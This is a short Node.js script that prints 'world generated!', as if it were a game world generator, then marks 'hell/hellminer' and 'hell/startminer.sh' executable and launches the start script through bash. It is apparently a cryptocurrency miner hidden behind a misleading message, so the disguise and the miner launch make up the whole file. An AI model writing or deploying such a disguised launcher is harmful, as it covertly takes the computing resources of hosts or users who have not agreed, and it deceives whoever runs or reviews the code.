const { exec, spawn } = require('child_process');

console.log("world generated!");

(async () => {
  
    await exec('chmod +x hell/hellminer', (err, stdout, stderr) => {
        if (err) console.error(err)
        else {
            //console.log(`stdout: ${stdout}`);
            //console.log(`stderr: ${stderr}`);
        }
    });
    await exec('chmod +x hell/startminer.sh', (err, stdout, stderr) => {
        if (err) console.error(err) 
        else {
            //console.log(`stdout: ${stdout}`);
            //console.log(`stderr: ${stderr}`);
        }
    });

    // await exec('./hell/startminer.sh', (err, stdout, stderr) => {
    //     if (err) console.error(err) 
    // });
    await spawn('bash', ['hell/startminer.sh'], { stdio: 'inherit' });
 
})();